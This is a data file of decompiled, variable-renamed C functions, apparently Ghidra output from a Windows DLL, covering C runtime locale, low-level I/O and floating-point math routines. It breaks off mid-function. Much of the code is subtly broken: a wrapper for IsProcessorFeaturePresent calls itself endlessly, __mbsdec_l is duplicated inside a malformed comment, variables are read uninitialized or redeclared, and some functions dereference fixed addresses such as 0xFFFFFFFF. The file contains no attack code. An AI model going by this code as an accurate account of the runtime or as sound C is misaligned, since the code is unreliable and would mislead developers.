{"Function Name": "FUN_10031a16", "Address": "10031a16", "Source Code": "undefined4 __cdecl FUN_10031a16(int input1, int input2, int input3, int input4, undefined8 *output)\n{\n    \n    double absoluteValue = ABS((double)CONCAT44(input2, input1));\n    double result = constantValue; \n    \n    if (input4 == 0x7ff00000) {\n        \n        if (input3 == 0) {\n            \n            if (1.0 < absoluteValue == NAN(absoluteValue) && absoluteValue < 1.0) {\n                result = 0.0; \n            }\n            goto LAB_10031b3b; \n        }\n    } \n    \n    else if (input4 == -0x100000 && input3 == 0) {\n        \n        if (1.0 < absoluteValue == NAN(absoluteValue)) {\n            result = (absoluteValue < 1.0) ? constantValue : 1.0; \n        } else {\n            result = 0.0; \n        }\n        goto LAB_10031b3b; \n    }\n    \n    if (input2 == 0x7ff00000) {\n        \n        if (input1 != 0) {\n            return 0; \n        }\n        \n        absoluteValue = (double)CONCAT44(input4, input3);\n        \n        if ((absoluteValue <= 0.0) && (result = 0.0, absoluteValue < 0.0 == NAN(absoluteValue))) {\n            result = 1.0; \n        }\n    } else {\n        \n        if (input2 != -0x100000) {\n            return 0; \n        }\n        \n        if (input1 != 0) {\n            return 0; \n        }\n        \n        int functionResult = FUN_100319ac((double)CONCAT44(input4, input3));\n        absoluteValue = (double)CONCAT44(input4, input3); \n        \n        if (absoluteValue <= 0.0) {\n            result = (absoluteValue < 0.0 == NAN(absoluteValue)) ? 1.0 : 0.0; \n            \n            if (functionResult == 1) {\n                result = (absoluteValue < 0.0 == NAN(absoluteValue)) ? result : anotherConstant; \n            }\n        } else {\n            result = constantValue; \n            \n            if (functionResult == 1) {\n                result = -constantValue; \n            }\n        }\n    }\n    \nLAB_10031b3b:\n    *output = result; \n    return 0; \n}"}
{"Function Name": "FUN_10031bb1", "Address": "10031bb1", "Source Code": "undefined4 getUndefinedValue(void) \n{\n    return globalValue; \n}"}
{"Function Name": "___acrt_update_thread_locale_data", "Address": "10031e81", "Source Code": "undefined ** ___acrt_update_thread_locale_data(void)\n{\n    __acrt_ptd *thread_local_data; \n    undefined **locale_data; \n    thread_local_data = FUN_10029224(); \n    \n    if (((*(uint *)(thread_local_data + 0x350) & DAT_1004e808) == 0) || \n        (locale_data = *(undefined ***)(thread_local_data + 0x4c), locale_data == (undefined **)0x0)) {\n        \n        ___acrt_lock(4); \n        \n        locale_data = __updatetlocinfoEx_nolock((void **)(thread_local_data + 0x4c), DAT_10050080);\n        FUN_10031ee7(); \n        \n        if (locale_data == (undefined **)0x0) {\n            _abort(); \n        }\n    }\n    return locale_data; \n}"}
{"Function Name": "FUN_10031ee7", "Address": "10031ee7", "Source Code": "void unlock_function(void) \n{\n    unlock_acrt(4); \n}"}
{"Function Name": "_LangCountryEnumProcEx@12", "Address": "100341f0", "Source Code": "void _LangCountryEnumProcEx_12(wchar_t *inputString) \n{\n    __acrt_ptd *threadLocalData; \n    int returnValue; \n    wchar_t *stringPointer; \n    wchar_t dataBuffer[64]; \n    uint securityCheck = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    threadLocalData = FUN_10029224(); \n    returnValue = FUN_1002d288(inputString, (-(uint)(*(int *)(threadLocalData + 100) != 0) & 0xfffff005) + 0x1002, dataBuffer, 0x40); \n    if (returnValue == 0) { \n        *(undefined4 *)(threadLocalData + 0x58) = 0; \n        goto LAB_100344bd; \n    }\n    returnValue = FUN_100249c3(*(wchar_t **)(threadLocalData + 0x54), dataBuffer); \n    if (returnValue != 0) goto LAB_10034343; \n    returnValue = FUN_1002d288(inputString, (-(uint)(*(int *)(threadLocalData + 0x60) != 0) & 0xfffff002) + 0x1001, dataBuffer, 0x40); \n    if (returnValue == 0) { \n        *(undefined4 *)(threadLocalData + 0x58) = 0; \n        goto LAB_100344bd; \n    }\n    returnValue = FUN_100249c3(*(wchar_t **)(threadLocalData + 0x50), dataBuffer); \n    stringPointer = inputString; \n    if (returnValue == 0) { \n        *(uint *)(threadLocalData + 0x58) |= 0x304; \n        while (*stringPointer != L'\\0') { \n            stringPointer++; \n        }\n        LAB_100342bc: \n        returnValue = FUN_10025329((wchar_t *)(threadLocalData + 0x2a0), 0x55, inputString, ((int)stringPointer - (int)(inputString + 1) >> 1) + 1); \n        if (returnValue != 0) goto LAB_100344d4; \n    } else if (((byte)threadLocalData[0x58] & 2) == 0) { \n        if ((*(int *)(threadLocalData + 0x5c) == 0) || (returnValue = FUN_1003695f(*(wchar_t **)(threadLocalData + 0x50), dataBuffer, *(size_t *)(threadLocalData + 0x5c)), returnValue != 0)) { \n            if ((((byte)threadLocalData[0x58] & 1) != 0) || (returnValue = _TestDefaultCountry(inputString), returnValue == 0)) goto LAB_10034343; \n            *(uint *)(threadLocalData + 0x58) |= 1; \n            while (*stringPointer != L'\\0') { \n                stringPointer++; \n            }\n        } else {\n            *(uint *)(threadLocalData + 0x58) |= 2; \n            while (*stringPointer != L'\\0') { \n                stringPointer++; \n            }\n        }\n        goto LAB_100342bc; \n    }\nLAB_10034343: \n    if ((*(uint *)(threadLocalData + 0x58) & 0x300) == 0x300) goto LAB_100344bd; \n    returnValue = FUN_1002d288(inputString, (-(uint)(*(int *)(threadLocalData + 0x60) != 0) & 0xfffff002) + 0x1001, dataBuffer, 0x40); \n    if (returnValue == 0) { \n        *(undefined4 *)(threadLocalData + 0x58) = 0; \n        goto LAB_100344bd; \n    }\n    returnValue = FUN_100249c3(*(wchar_t **)(threadLocalData + 0x50), dataBuffer); \n    if (returnValue != 0) goto LAB_100344bd; \n    *(uint *)(threadLocalData + 0x58) |= 0x200; \n    stringPointer = inputString; \n    if (*(int *)(threadLocalData + 0x60) == 0) { \n        if (*(int *)(threadLocalData + 0x5c) != 0) { \n            short *dataPointer = *(short **)(threadLocalData + 0x50); \n            short *nextDataPointer = dataPointer + 1; \n            while (*dataPointer != 0) { \n                dataPointer++; \n            }\n            if ((int)dataPointer - (int)nextDataPointer >> 1 == *(int *)(threadLocalData + 0x5c)) { \n                returnValue = _TestDefaultCountry(inputString); \n                if (returnValue == 0) { \n                    dataPointer = *(short **)(threadLocalData + 0x50); \n                    nextDataPointer = dataPointer + 1; \n                    while (*dataPointer != 0) { \n                        dataPointer++; \n                    }\n                    returnValue = _GetPrimaryLen(*(ushort **)(threadLocalData + 0x50)); \n                    if (returnValue == (int)dataPointer - (int)nextDataPointer >> 1) goto LAB_100344bd; \n                }\n            }\n            *(uint *)(threadLocalData + 0x58) |= 0x100; \n            if (*(short *)(threadLocalData + 0x2a0) != 0) goto LAB_100344bd; \n            while (*stringPointer != L'\\0') { \n                stringPointer++; \n            }\n            goto LAB_100343db; \n        }\n    }\n    *(uint *)(threadLocalData + 0x58) |= 0x100; \n    if (*(short *)(threadLocalData + 0x2a0) != 0) goto LAB_100344bd; \n    while (*stringPointer != L'\\0') { \n        stringPointer++; \n    }\nLAB_100343db: \n    returnValue = FUN_10025329((wchar_t *)(threadLocalData + 0x2a0), 0x55, inputString, ((int)stringPointer - (int)(inputString + 1) >> 1) + 1); \n    if (returnValue != 0) { \nLAB_100344d4: \n        __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n    }\nLAB_100344bd: \n    ___security_check_cookie_4(securityCheck ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "_LangCountryEnumProc@4", "Address": "10034b27", "Source Code": "void _LangCountryEnumProc_4(ushort *languageCountryEnum) \n{\n    uint *uintPointer; \n    LCID localeIdentifier; \n    int returnValue; \n    WCHAR localeBuffer[120]; \n    uint stackSecurityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    uintPointer = *(uint **)(FUN_10029224() + 0x34c); \n    localeIdentifier = _LcidFromHexString(languageCountryEnum); \n    returnValue = GetLocaleInfoW(localeIdentifier, 0x1002 - (*(int *)(FUN_10029224() + 100) != 0), localeBuffer, 0x78); \n    if (returnValue == 0) { \n        *uintPointer = 0; \n        goto LAB_10034d64; \n    }\n    returnValue = FUN_100249c3(*(wchar_t **)(FUN_10029224() + 0x54), localeBuffer); \n    if (returnValue == 0) { \n        returnValue = GetLocaleInfoW(localeIdentifier, 0x1001 - (*(int *)(FUN_10029224() + 0x60) != 0), localeBuffer, 0x78); \n        if (returnValue == 0) goto LAB_10034d64; \n        returnValue = FUN_100249c3(*(wchar_t **)(FUN_10029224() + 0x50), localeBuffer); \n        if (returnValue == 0) { \n            *uintPointer |= 0x304; \n            uintPointer[2] = localeIdentifier; \n        } else if ((*(byte *)uintPointer & 2) == 0) { \n            if ((*(int *)(FUN_10029224() + 0x5c) == 0) || \n                (returnValue = FUN_1003695f(*(wchar_t **)(FUN_10029224() + 0x50), localeBuffer, *(size_t *)(FUN_10029224() + 0x5c)), returnValue != 0)) { \n                if (((*uintPointer & 1) == 0) && (returnValue = _TestDefaultCountry((short)localeIdentifier), returnValue != 0)) { \n                    *uintPointer |= 1; \n                    goto LAB_10034c5a; \n                }\n            } else {\n                *uintPointer |= 2; \n                uintPointer[2] = localeIdentifier; \n                short *shortPointer = *(short **)(FUN_10029224() + 0x50); \n                short *nextShortPointer = shortPointer + 1; \n                while (*shortPointer++); \n                if ((int)shortPointer - (int)nextShortPointer >> 1 == *(int *)(FUN_10029224() + 0x5c)) { \n                    uintPointer[1] = localeIdentifier; \n                }\n            }\n        }\n    }\n    if ((*uintPointer & 0x300) == 0x300) goto LAB_10034d64; \n    returnValue = GetLocaleInfoW(localeIdentifier, 0x1001 - (*(int *)(FUN_10029224() + 0x60) != 0), localeBuffer, 0x78); \n    if (returnValue == 0) { \n        *uintPointer = 0; \n        goto LAB_10034d64; \n    }\n    returnValue = FUN_100249c3(*(wchar_t **)(FUN_10029224() + 0x50), localeBuffer); \n    if (returnValue == 0) { \n        *uintPointer |= 0x200; \n        if ((*(int *)(FUN_10029224() + 0x60) == 0) && (*(int *)(FUN_10029224() + 0x5c) != 0)) { \n            short *shortPointer = *(short **)(FUN_10029224() + 0x50); \n            short *nextShortPointer = shortPointer + 1; \n            while (*shortPointer++); \n            if ((int)shortPointer - (int)nextShortPointer >> 1 != *(int *)(FUN_10029224() + 0x5c)) goto LAB_10034cbf; \n            if (_TestDefaultLanguage(localeIdentifier, 1) == 0) goto LAB_10034d64; \n            *uintPointer |= 0x100; \n        } else {\n        LAB_10034cbf: \n            *uintPointer |= 0x100; \n        }\n    } else {\n        if ((((*(int *)(FUN_10029224() + 0x60) != 0) || (*(int *)(FUN_10029224() + 0x5c) == 0)) || \n            (returnValue = FUN_100249c3(*(wchar_t **)(FUN_10029224() + 0x50), localeBuffer), returnValue != 0)) || \n            (returnValue = _TestDefaultLanguage(localeIdentifier, 0), returnValue == 0)) goto LAB_10034d64; \n        *uintPointer |= 0x100; \n    }\n    if (uintPointer[1] == 0) { \n        uintPointer[1] = localeIdentifier; \n    }\nLAB_10034d64: \n    ___security_check_cookie_4(stackSecurityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "___acrt_lowio_create_handle_array", "Address": "1003527b", "Source Code": "undefined4 * ___acrt_lowio_create_handle_array(void)\n{\n    \n    undefined4 *allocatedArray = (undefined4 *)__calloc_base(0x40, 0x30);\n    \n    \n    if (allocatedArray != (undefined4 *)0x0 && allocatedArray != allocatedArray + 0x300) {\n        \n        undefined4 *currentElement = allocatedArray + 8;\n        \n        \n        do {\n            \n            ___acrt_InitializeCriticalSectionEx_12((LPCRITICAL_SECTION)(currentElement - 8), 4000, 0);\n            \n            \n            currentElement[-2] = 0xffffffff;\n            \n            \n            *currentElement = 0;\n            \n            \n            currentElement[1] = 0;\n            \n            \n            currentElement[2] = 0xa0a0000;\n            \n            \n            *(undefined *)(currentElement + 3) = 10;\n            \n            \n            *(byte *)((int)currentElement + 0xd) &= 0xf8;\n            \n            \n            *(undefined *)((int)currentElement + 0xe) = 0;\n            \n            \n            currentElement += 0xc;\n        } while (currentElement != allocatedArray + 0x300); \n    }\n    \n    \n    return allocatedArray;\n}"}
{"Function Name": "___acrt_lowio_ensure_fh_exists", "Address": "1003532a", "Source Code": "undefined4 __cdecl ___acrt_lowio_ensure_fh_exists(uint requested_handle_count)\n{\n    undefined4 *handle_array_pointer; \n    undefined4 return_status = 0; \n    \n    if (requested_handle_count < 0x2000) {\n        ___acrt_lock(7); \n        int handle_index = 0; \n        int current_handle_count = handle_array_size; \n        \n        while (current_handle_count <= (int)requested_handle_count) {\n            \n            if ((&handle_array)[handle_index] == 0) {\n                handle_array_pointer = ___acrt_lowio_create_handle_array(); \n                (&handle_array)[handle_index] = handle_array_pointer; \n                \n                if (handle_array_pointer == (undefined4 *)0x0) {\n                    return_status = 0xc; \n                    break; \n                }\n                current_handle_count = handle_array_size + 0x40; \n                handle_array_size = current_handle_count; \n            }\n            handle_index++; \n        }\n        post_handle_creation_function(); \n    } else {\n        handle_array_pointer = (undefined4 *)get_large_handle_function(); \n        return_status = 9; \n        *handle_array_pointer = 9; \n        cleanup_function(); \n    }\n    return return_status; \n}"}
{"Function Name": "FUN_100353b9", "Address": "100353b9", "Source Code": "void unlock_function(void) \n{\n    acrt_unlock(7); \n}"}
{"Function Name": "__mbsdec_l", "Address": "10035f67", "Source Code": "\\*\nuchar * __cdecl __mbsdec_l(uchar *startPointer, uchar *currentPosition, _locale_t locale)\n{\n    undefined4 *undefinedPointer; \n    byte *bytePointer;       \n    int localIndex;       \n    int localArray[2];   \n    \n    if (startPointer == (uchar *)0x0 || currentPosition == (uchar *)0x0) {\n        undefinedPointer = (undefined4 *)FUN_100253b8(); \n        *undefinedPointer = 0x16; \n        FUN_1001de96(); \n    } \n    \n    else if (startPointer < currentPosition) {\n        FUN_1001bfff(localArray, (__acrt_ptd **)locale); \n        \n        if (*(int *)(localIndex + 8) != 0) {\n            bytePointer = currentPosition - 1; \n            do {\n                bytePointer--; \n                \n                if (bytePointer < startPointer) break; \n            } while ((*(byte *)(*bytePointer + 0x19 + localIndex) & 4) != 0); \n            currentPosition -= ((int)currentPosition - (int)bytePointer & 1U); \n        }\n    }\n    return currentPosition - 1; \n}\n*\\ \n \nuchar * __cdecl __mbsdec_l(uchar *startPointer, uchar *currentPosition, _locale_t locale)\n{\n    undefined4 *undefinedPointer;\n    byte *bytePointer;\n    int localIndex;\n    int localArray[2];\n    if (startPointer == (uchar *)0x0 || currentPosition == (uchar *)0x0) {\n        undefinedPointer = (undefined4 *)FUN_100253b8();\n        *undefinedPointer = 0x16;\n        FUN_1001de96();\n    } else if (startPointer < currentPosition) {\n        FUN_1001bfff(localArray, (__acrt_ptd **)locale);\n        if (*(int *)(localIndex + 8) != 0) {\n            bytePointer = currentPosition - 1;\n            do {\n                bytePointer--;\n                if (bytePointer < startPointer) break;\n            } while ((*(byte *)(*bytePointer + 0x19 + localIndex) & 4) != 0);\n            currentPosition -= ((int)currentPosition - (int)bytePointer & 1U);\n        }\n    }\n    return currentPosition - 1;\n}"}
{"Function Name": "FUN_100364fd", "Address": "100364fd", "Source Code": "float10 __cdecl FUN_100364fd(double input_value)\n{\n    \n    return (float10)ROUND(input_value);\n}"}
{"Function Name": "FUN_10036610", "Address": "10036610", "Source Code": "void FUN_10036610(void) \n{\n    ushort fpuControlWord; \n    double doubleValue; \n    if (globalFlag != 0) { \n        if ((mxcsrRegister & 0x7f80) == 0x1f80 && (fpuControlWord & 0x7f) == 0x7f) { \n            FUN_10036c40(); \n            return; \n        }\n    }\n    doubleValue = (double)st0Input; \n    FUN_100318a8(SUB84(doubleValue, 0), (uint)((ulonglong)doubleValue >> 0x20)); \n    FUN_10036668(SUB84(doubleValue, 0), (uint)((ulonglong)doubleValue >> 0x20)); \n}"}
{"Function Name": "FUN_10036668", "Address": "10036668", "Source Code": "uint __cdecl FUN_10036668(int input_param_1, uint input_param_2)\n{\n    uint result_value; \n    uint status_value; \n    \n    if (zero_flag) {\n        \n        if (((input_EAX & 0xfffff) != 0) || (input_param_1 != 0)) {\n            status_value = FUN_1003184c(); \n            goto LAB_10036701; \n        }\n        status_value = input_EAX & 0x80000000; \n        result_value = status_value; \n    } else {\n        result_value = input_param_2; \n        \n        if ((input_param_2 & 0x7ff00000) == 0) {\n            \n            if (((input_param_2 & 0xfffff) == 0) && (input_param_1 == 0)) {\n                status_value = 2; \n                goto LAB_10036701; \n            }\n            status_value = input_param_2 & 0x80000000; \n        } else {\n            status_value = input_param_2 & 0x80000000; \n        }\n    }\n    \n    if (status_value == 0) {\n        \n        if (data_value != 0) {\n            return result_value; \n        }\n        \n        status_value = math_exit_function(\"log10\", 0x1b, return_address, input_param_1, input_param_2);\n        return status_value; \n    }\n    status_value = 1; \nLAB_10036701:\n    \n    if (data_value != 0) {\n        return status_value; \n    }\n    \n    start_one_arg_error_handling(\"log10\", 0x1b, FPU_control_word, return_address, input_param_1, input_param_2);\n    return status_value; \n}"}
{"Function Name": "FUN_10036720", "Address": "10036720", "Source Code": "float10 __cdecl FUN_10036720(double input_value)\n{\n    uint exponent; \n    uint upper_bits; \n    double computed_value; \n    longlong shift_amount; \n    \n    if (DAT_10050528 != 0) {\n        \n        if ((MXCSR & 0x7f80) == 0x1f80 && (in_FPUControlWord & 0x7f) == 0x7f) {\n            upper_bits = (uint)((ulonglong)input_value >> 0x20); \n            exponent = upper_bits >> 0x14; \n            shift_amount = CONCAT44(_UNK_10046f24, _DAT_10046f20 - (upper_bits >> 0x14 & _DAT_10046f40)); \n            \n            if ((exponent & 0x800) == 0) {\n                computed_value = (double)(((ulonglong)input_value >> shift_amount) << shift_amount); \n                \n                if (exponent < 0x3ff) {\n                    return (float10)(double)(-(ulonglong)(_DAT_10046f30 < input_value) & _DAT_10046f10); \n                }\n                \n                if (exponent < 0x433) {\n                    return (float10)(computed_value + (double)(-(ulonglong)(computed_value < input_value) & _DAT_10046f10)); \n                }\n            } else {\n                \n                if (exponent < 0xbff) {\n                    return (float10)_DAT_10046f50; \n                }\n                if (exponent < 0xc33) {\n                    return (float10)(double)(((ulonglong)input_value >> shift_amount) << shift_amount); \n                }\n            }\n            \n            if (NAN(input_value)) {\n                ___libm_error_support(&input_value, &input_value, &input_value, 0x3ec); \n            }\n            return (float10)input_value; \n        }\n    }\n    upper_bits = __ctrlfp(0x1b3f, 0xffff); \n    \n    if ((input_value._6_2_ & 0x7ff0) == 0x7ff0) {\n        \n        if (__sptype(SUB84(input_value, 0), (uint)((ulonglong)input_value >> 0x20)) - 1U < 3) {\n            __ctrlfp(upper_bits, 0xffff); \n            return (float10)input_value; \n        }\n        computed_value = DAT_10048578 + input_value; \n    } else {\n        computed_value = (double)FUN_100364fd(input_value); \n        \n        if ((NAN((float10)input_value) || NAN((float10)computed_value)) != ((float10)input_value == (float10)computed_value) || ((upper_bits & 0x20) != 0)) {\n            __ctrlfp(upper_bits, 0xffff); \n            return (float10)computed_value; \n        }\n    }\n    return (float10)__except1(0x10, 0xc, input_value, computed_value, upper_bits); \n}"}
{"Function Name": "FUN_1003695f", "Address": "1003695f", "Source Code": "int __cdecl FUN_1003695f(wchar_t *first_string, wchar_t *second_string, size_t length)\n{\n    wchar_t first_char, second_char; \n    int comparison_result; \n    \n    if (DAT_1005007c == 0) {\n        comparison_result = 0; \n        \n        if (length != 0) {\n            \n            if (first_string == (wchar_t *)0x0 || second_string == (wchar_t *)0x0) {\n                *(undefined4 *)FUN_100253b8() = 0x16; \n                FUN_1001de96(); \n                comparison_result = 0x7fffffff; \n            } else {\n                \n                comparison_result = (int)first_string - (int)second_string;\n                do {\n                    \n                    second_char = *(wchar_t *)(comparison_result + (int)second_string);\n                    \n                    if ((0x40 < (ushort)second_char) && ((ushort)second_char < 0x5b)) {\n                        second_char += L' ';\n                    }\n                    \n                    first_char = *second_string;\n                    \n                    if ((0x40 < (ushort)first_char) && ((ushort)first_char < 0x5b)) {\n                        first_char += L' ';\n                    }\n                    second_string++; \n                    length--; \n                } while (length != 0 && second_char != L'\\0' && second_char == first_char); \n                \n                comparison_result = (uint)(ushort)second_char - (uint)(ushort)first_char;\n            }\n        }\n    } else {\n        \n        comparison_result = __wcsnicmp_l(first_string, second_string, length, (_locale_t)0x0);\n    }\n    return comparison_result; \n}"}
{"Function Name": "FUN_10036b1a", "Address": "10036b1a", "Source Code": "undefined4 getUndefinedValue(void) \n{\n    return globalValue; \n}"}
{"Function Name": "__clearfp", "Address": "10036b56", "Source Code": "uint __cdecl __clearfp(void) \n{\n    uint mxcsrStatus = 0; \n    ushort fpuStatusWord; \n    if (conditionFlag >= 1) { \n        uint fpuStatus = 0; \n        if ((fpuStatusWord & 0x3f) != 0) { \n            if ((fpuStatusWord & 1) != 0) fpuStatus |= 0x10; \n            if ((fpuStatusWord & 4) != 0) fpuStatus |= 8; \n            if ((fpuStatusWord & 8) != 0) fpuStatus |= 4; \n            if ((fpuStatusWord & 0x10) != 0) fpuStatus |= 2; \n            if ((fpuStatusWord & 0x20) != 0) fpuStatus |= 1; \n            if ((fpuStatusWord & 2) != 0) fpuStatus |= 0x80000; \n        }\n        if ((mxcsrRegister & 0x3f) != 0) { \n            if ((mxcsrRegister & 1) != 0) mxcsrStatus |= 0x10; \n            if ((mxcsrRegister & 4) != 0) mxcsrStatus |= 8; \n            if ((mxcsrRegister & 8) != 0) mxcsrStatus |= 4; \n            if ((mxcsrRegister & 0x10) != 0) mxcsrStatus |= 2; \n            if ((mxcsrRegister & 0x20) != 0) mxcsrStatus |= 1; \n            if ((mxcsrRegister & 2) != 0) mxcsrStatus |= 0x80000; \n        }\n        mxcsrStatus |= fpuStatus; \n        mxcsrRegister &= 0xffffffc0; \n    }\n    return mxcsrStatus; \n}"}
{"Function Name": "FUN_10036c40", "Address": "10036c40", "Source Code": "void functionExecute(void) \n{\n    functionProcess((double)inputValue); \n}"}
{"Function Name": "FUN_10036c5e", "Address": "10036c5e", "Source Code": "float10 __cdecl FUN_10036c5e(double param_1)\n{\n    uint tempUnsignedInt1; \n    uint tempUnsignedInt2; \n    int integerValue = 0; \n    double doubleValue1, doubleValue2, doubleValue3, doubleValue4, doubleValue6; \n    \n    while (true) { \n        tempUnsignedInt2 = (uint)(ushort)(in_XMM0._6_2_ >> 4); \n        doubleValue1 = (double)(in_XMM0._0_8_ & (ulonglong)_DAT_10046f70 | (ulonglong)DAT_10046fe0); \n        doubleValue2 = (double)(in_XMM0._0_8_ & _UNK_10046f78 | _UNK_10046fe8); \n        tempUnsignedInt1 = SUB82(_DAT_10046f90 + doubleValue1, 0) & 0x7f0; \n        doubleValue6 = (double)(_UNK_10046fa8 & (ulonglong)doubleValue2); \n        doubleValue4 = (double)(_DAT_10046fa0 & (ulonglong)doubleValue1) * *(double *)(&DAT_10047480 + tempUnsignedInt1) - _DAT_10046f80; \n        doubleValue1 = (doubleValue1 - (double)(_DAT_10046fa0 & (ulonglong)doubleValue1)) * *(double *)(&DAT_10047480 + tempUnsignedInt1); \n        doubleValue3 = (doubleValue2 - doubleValue6) * *(double *)(&UNK_10047488 + tempUnsignedInt1); \n        doubleValue2 = doubleValue1 + doubleValue4; \n        in_XMM0._8_8_ = doubleValue3 + (doubleValue6 * *(double *)(&UNK_10047488 + tempUnsignedInt1) - _UNK_10046f88); \n        if (tempUnsignedInt2 - 1 < 0x7fe) { \n            integerValue += (tempUnsignedInt2 - 0x3ff); \n            double doubleValue6 = (double)integerValue; \n            int conditionalInteger = (tempUnsignedInt1 + integerValue * 0x400 == 0) ? 0x10 : 0; \n            return (float10)(((_UNK_10047038 * in_XMM0._8_8_ + _UNK_10047048) * in_XMM0._8_8_ +\n                _UNK_10047058) * in_XMM0._8_8_ * in_XMM0._8_8_ + \n                ((_DAT_10047030 * doubleValue2 + _DAT_10047040) * doubleValue2 + _DAT_10047050) *\n                doubleValue2 * doubleValue2 * doubleValue2 * doubleValue2 * doubleValue2 + _DAT_10047060 * doubleValue2 + \n                *(double *)(&UNK_10047078 + tempUnsignedInt1) + doubleValue6 * _UNK_10046fb8 + \n                (double)((ulonglong)doubleValue3 & *(ulonglong *)(&UNK_10046fc8 + conditionalInteger)) + \n                *(double *)(&DAT_10047070 + tempUnsignedInt1) + doubleValue4 + doubleValue6 * _DAT_10046fb0 + \n                (double)((ulonglong)doubleValue1 & *(ulonglong *)(&DAT_10046fc0 + conditionalInteger))); \n        }\n        \n        if (SUB82((double)-(ulonglong)(_DAT_10046ff0 == param_1), 0) != 0) break; \n        \n        if (tempUnsignedInt2 - 1 != 0xffffffff) { \n            if (tempUnsignedInt2 < 0x7ff) { \n                if (DAT_10046fe0 == (double)((ulonglong)param_1 & (ulonglong)_DAT_10046f70 | (ulonglong)DAT_10046fe0)) { \n                    return (float10)_DAT_10047018; \n                }\n                integerValue = 0x3e9; \n            } else if (((tempUnsignedInt2 & 0x7ff) < 0x7ff) || \n                       (SUB84(param_1, 0) | (uint)((ulonglong)param_1 >> 0x20) & 0xfffff) == 0)) {\n                return (float10)-NAN; \n            } else {\n                integerValue = 0x3e9; \n            }\n            goto LAB_10036e6a; \n        }\n        \n        in_XMM0._0_8_ = param_1 * DAT_10047000; \n        integerValue = -0x34; \n    }\n    \n    integerValue = 8; \nLAB_10036e6a:\n    ___libm_error_support(&param_1, &param_1, (double)-(ulonglong)(_DAT_10046ff0 == param_1), integerValue); \n    return (float10)(double)-(ulonglong)(_DAT_10046ff0 == param_1); \n}"}
{"Function Name": "KERNEL32.DLL::IsProcessorFeaturePresent", "Address": "10036ff1", "Source Code": "BOOL IsProcessorFeaturePresent(DWORD feature_id)\n{\n    \n    return IsProcessorFeaturePresent(feature_id);\n}"}
{"Function Name": "FUN_1003700c", "Address": "1003700c", "Source Code": "void FUN_1003700c(void)\n{\n    \n    securityCheckCookie(*(uint *)(*(uint *)0x10) ^ *(uint *)0x0);\n    \n    \n    processFurther();\n}"}
{"Function Name": "FUN_100373d9", "Address": "100373d9", "Source Code": "void FUN_100373d9(void) \n{\n    \n    \n    \n    \n    security_check_cookie(*(uint *)(*(uint *)0xFFFFFFFF - 0x1c) ^ *(uint *)0xFFFFFFFF);\n}"}
{"Function Name": "FUN_100375f0", "Address": "100375f0", "Source Code": "ulonglong __fastcall FUN_100375f0(undefined4 input_param_1, undefined4 input_param_2)\n{\n    ulonglong rounded_value; \n    uint upper_bits; \n    float float_representation; \n    float10 input_value; \n    \n    if (global_variable == 0) {\n        rounded_value = (ulonglong)ROUND(input_value); \n        upper_bits = (uint)(rounded_value >> 0x20); \n        float_representation = (float)input_value; \n        \n        if ((rounded_value != 0) || ((rounded_value & 0x7fffffff00000000) != 0)) {\n            \n            if ((int)float_representation < 0) {\n                \n                rounded_value += (0x80000000 < ((uint)(float)(input_value - (float10)rounded_value) ^ 0x80000000));\n            } else {\n                \n                rounded_value = CONCAT44((int)upper_bits - (uint)(rounded_value < (0x80000000 < (uint)(float)(input_value - (float10)rounded_value))), rounded_value);\n            }\n        }\n        return rounded_value; \n    }\n    \n    return CONCAT44(input_param_2, (int)input_value);\n}"}
{"Function Name": "FUN_100376b0", "Address": "100376b0", "Source Code": "undefined (*) [16] __cdecl FUN_100376b0(undefined (*inputArray) [16], byte inputByte) {\n    uint byteValue; \n    undefined (*foundElementPointer) [16]; \n    int loopIndex; \n    char *charPointer; \n    byte *bytePointer; \n    undefined intermediateValues[16]; \n    \n    if (globalVariable != 0) {\n        \n        if (globalVariable < 2) {\n            \n            intermediateValues = pshuflw(ZEXT216(CONCAT11(inputByte, inputByte)), ZEXT216(CONCAT11(inputByte, inputByte)), 0);\n            \n            byteValue = -1 << (sbyte)((uint)inputArray & 0xf);\n            \n            charPointer = (char *)((int)inputArray - ((uint)inputArray & 0xf));\n            while (true) {\n                \n                for (int byteIndex = 0; byteIndex < 16; byteIndex++) {\n                    \n                    intermediateValues[byteIndex] = -(charPointer[byteIndex] == '\\0');\n                }\n                \n                byteValue = (ushort)((ushort)(SUB161(intermediateValues >> 7, 0) & 1) |\n                                 (ushort)(SUB161(intermediateValues >> 0xf, 0) & 1) << 1 |\n                                 (ushort)(SUB161(intermediateValues >> 0x17, 0) & 1) << 2 |\n                                 (ushort)(SUB161(intermediateValues >> 0x1f, 0) & 1) << 3 |\n                                 (ushort)(SUB161(intermediateValues >> 0x27, 0) & 1) << 4 |\n                                 (ushort)(SUB161(intermediateValues >> 0x2f, 0) & 1) << 5 |\n                                 (ushort)(SUB161(intermediateValues >> 0x37, 0) & 1) << 6 |\n                                 (ushort)(SUB161(intermediateValues >> 0x3f, 0) & 1) << 7 |\n                                 (ushort)(SUB161(intermediateValues >> 0x47, 0) & 1) << 8 |\n                                 (ushort)(SUB161(intermediateValues >> 0x4f, 0) & 1) << 9 |\n                                 (ushort)(SUB161(intermediateValues >> 0x57, 0) & 1) << 10 |\n                                 (ushort)(SUB161(intermediateValues >> 0x5f, 0) & 1) << 0xb |\n                                 (ushort)(SUB161(intermediateValues >> 0x67, 0) & 1) << 0xc |\n                                 (ushort)(SUB161(intermediateValues >> 0x6f, 0) & 1) << 0xd |\n                                 (ushort)(SUB161(intermediateValues >> 0x77, 0) & 1) << 0xe |\n                                 (ushort)(intermediateValues[0xf] >> 7) << 0xf) & byteValue;\n                \n                if (byteValue != 0) break;\n                \n                charPointer += 0x10;\n            }\n            \n            return (undefined (*) [16])(charPointer + loopIndex);\n        }\n        \n        byteValue = (uint)inputByte;\n        \n        if (byteValue == 0) {\n            \n            charPointer = (char *)((uint)inputArray & 0xfffffff0);\n            while (true) {\n                \n                for (int byteIndex = 0; byteIndex < 16; byteIndex++) {\n                    \n                    intermediateValues[byteIndex] = -(charPointer[byteIndex] == '\\0');\n                }\n                \n                byteValue = (uint)(ushort)((ushort)(SUB161(intermediateValues >> 7, 0) & 1) |\n                                       (ushort)(SUB161(intermediateValues >> 0xf, 0) & 1) << 1 |\n                                       (ushort)(SUB161(intermediateValues >> 0x17, 0) & 1) << 2 |\n                                       